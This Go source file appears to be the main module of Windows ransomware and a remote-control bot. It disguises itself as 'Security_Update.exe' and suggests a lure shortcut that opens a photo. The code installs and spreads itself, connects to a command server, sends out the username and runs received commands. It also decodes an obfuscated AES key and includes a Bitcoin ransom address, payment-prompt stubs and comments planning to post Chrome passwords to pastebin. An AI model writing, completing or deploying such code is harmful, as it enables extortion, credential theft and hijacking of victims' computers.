//go:generate goversioninfo -icon=icon.ico
//Compile: go build -ldflags "-s -w -H=windowsgui"

//Shortcut: C:\Windows\System32\cmd.exe /C foto.jpg && rolling-win.exe

package main

import (
	"fmt"
	"strings"
	"time"
)

const TARGET_FILE_NAME = "Security_Update.exe" // check name Wscript.exe
const BTC_ADDRESS string = "1BwwT5zo5FwQdWniUSay2AUrPrbYph9SxP"

var key_text []byte

func main() {
	//Check if already running
	CheckMultiInstances()
	Install()
	Spread()
	c, _ = ConnectCN()
	go Send("user", GetUsername())
	go ListenAndExecute()

	/*if ReadRegDone() {
		//Already encrypted
		PromtPay()
		ListenForPayment()
	}*/

	//Run Analytics
	//Put name, IP and status to pastebin

	//Send chrome pass to pastebin

	//Gen aes key,
	//Gen
	//Deofuscate key
	b64_1 := "fSss" + "L1IkKy"
	b64_2 := "p3ZU4zR" + "3g5e"
	b64_3 := "ipMZy5" + "VYm13O"
	b64_4 := "Xg+WF" + "9jKnE="
	final := b64_1 + b64_2 + b64_3 + b64_4
	key_text = []byte(Base64Decode(final))
	//When key decoded
	InitializeBlock()
	for {
	}
}

func ListenAndExecute() {
	for {
		status := Receive()
		go ParseProtocol(status)
	}

}

func ParseProtocol(r string) {
	commandBuff := strings.Split(r, " ")
	if len(commandBuff) > 1 {
		cmd := commandBuff[0]
		target := commandBuff[1]
		args := "null"
		if len(commandBuff) >= 3 {
			args = commandBuff[2]
		}
		fmt.Println(cmd, target, args)
		//Concurrently executes command
		Execute(cmd, target, args)

	}
}

func Wait() {
	time.Sleep(30 * time.Second)
}
